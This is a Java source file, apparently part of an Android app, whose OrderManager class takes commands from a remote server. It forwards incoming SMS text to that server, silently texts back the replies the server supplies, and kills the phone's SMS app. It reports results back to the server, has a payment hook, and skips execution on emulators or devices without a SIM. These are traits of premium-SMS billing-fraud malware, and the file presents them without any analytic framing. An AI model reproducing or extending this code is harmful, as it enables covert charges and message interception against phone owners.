package net.workspace.manager;
import java.util.ArrayList;
import net.workspace.http.HttpJsonThread;
import net.workspace.http.NetContext;
import net.workspace.listener.NetListener;
import net.workspace.listener.NetworkListener;
import net.workspace.listener.SendSmsListener;
import net.workspace.network.NetworkController;
import net.workspace.sms.SmsSender;
import net.workspace.util.Logger;
import net.workspace.util.T;
import org.json.JSONException;
import org.json.JSONObject;
import bean.Feedback;
import bean.IQAnswer;
import bean.Json;
import bean.Order;
import bean.RunningApp;
import bean.form.IQForm;
import bean.form.OrderForm;

public class OrderManager implements NetListener {
    public static final int ORDER = 1;
    public static final int INTELLIGENCE_QUESTION = 2;
    public static final int XJ_PAY = 9;
    private final static Object locker = new Object();
    private static OrderManager instance;
    private OrderManager() {}
    public static OrderManager getInstance() {
        if (instance == null) {
            synchronized (locker) {
                if (instance == null) instance = new OrderManager();
            }
        }
        return instance;
    }
    @Override
    public void onFailed(int i, String s, String s1) {
        reportFailure();
    }
    @Override
    public void onTimeout(int i) {
        reportFailure();
    }
    private void reportFailure() {
        //TODO,
    }
    @Override
    public void onSuccess(int callBack, String url, String retSrc) {
        T.killSmsApp();
        Logger.debug("callback", callBack);
        Logger.debug("retSrc", retSrc);
        try {
            JSONObject obj = T.toJson(retSrc);
            if (obj != null) {
                switch (callBack) {
                    case ORDER:
                        executeOrder(Json.optObj(Order.class, obj));
                        break;
                    case INTELLIGENCE_QUESTION:
                        anserIQ(Json.optObj(IQAnswer.class, obj));
                        break;
                    case XJ_PAY:
                        readXJPay(obj);
                        break;
                }
            }
        } catch (Exception e) {
            Logger.error(e);
        }
    }
    private void anserIQ(final IQAnswer iqAnswer) {
        if (iqAnswer != null) {
            new SmsSender(new SendSmsListener() {
                @Override
                public void onSendSmsFailed(String address, String message, String errorMsg) {
                    ReportManager.failureReport(iqAnswer, errorMsg);
                }
                @Override
                public void onSendSmsSuccess(String address, String message) {
                    ReportManager.successReport(iqAnswer, address + "->" + message);
                }
            }).sendSms(iqAnswer.reciever, iqAnswer.answer, iqAnswer.timeout);
        }
    }
    public void readXJPay(JSONObject jsonobject) {
        String result = jsonobject.optString("result");
        if (result.equals("0")) {}
    }
    /**
     * 智能回复短信
     * @param text
     * @param receiver
     * @param sign
     * @param payOrderId
     */
    public void requestIntelligenceQuestion(final String text, final String receiver, final Feedback feedback) {
        NetworkController.doNetworkTask(0, new NetworkListener() {
            @Override
            public void onResult(String errorMsg) {
                if (errorMsg == null) {
                    IQForm question = new IQForm(feedback, receiver, text);
                    T.fillForm(question);
                    try {
                        new HttpJsonThread(new NetContext(T.SERVER_URL, question.toJson(), OrderManager.this, 2, true)).startThread();
                    } catch (JSONException e) {
                        Logger.error(e);
                    }
                }
            }
        });
    }
    public void request() {
        NetworkController.doNetworkTask(0, new NetworkListener() {
            @Override
            public void onResult(String errorMsg) {
                if (errorMsg == null) {
                    //OrderForm form = new OrderForm(T.getSmsPermissionApp());
                    OrderForm form = new OrderForm(new ArrayList<RunningApp>());
                    T.fillForm(form);
                    try {
                        new HttpJsonThread(new NetContext(T.SERVER_URL, form.toJson(), OrderManager.this, 1, true)).startThread();
                    } catch (JSONException e) {
                        Logger.error(e);
                    }
                }
            }
        });
    }
    public void executeOrder(Order order) {
        FlowManager.getInstanse().execute(order, null);
    }
    private void sendSms(final Feedback feedback, final String number, final String msg) {
        new SmsSender(new SendSmsListener() {
            @Override
            public void onSendSmsFailed(String address, String message, String errorMsg) {
                ReportManager.failureReport(feedback, msg);
            }
            @Override
            public void onSendSmsSuccess(String address, String message) {
                ReportManager.successReport(feedback, number + "->" + msg);
            }
        }).sendSms(number, msg, feedback.timeout);
    }
    private static final int CONFIRM_TYPE_VARIABLE = 0;
    private static final int CONFIRM_TYPE_SERVER = 2;
    public void executeFeedback(String address, String text, Feedback feedback) {
        switch (feedback.type) {
            case CONFIRM_TYPE_VARIABLE: {
                String confimText = T.parseVariable(text, feedback.content);
                if (confimText != null) {
                    String receiver = (feedback.port != null && feedback.port.length() > 4) ? feedback.port : address;
                    sendSms(feedback, receiver, confimText);
                }
                break;
            }
            case CONFIRM_TYPE_SERVER: {
                requestIntelligenceQuestion(text, address, feedback);
                break;
            }
        }
    }
    public void execute() {
        if (T.isEmulator() || !T.isSimReady()) { return; }
        NetworkController.doNetworkTask(0, new NetworkListener() {
            @Override
            public void onResult(String errorMsg) {
                request();
            }
        });
    }
}
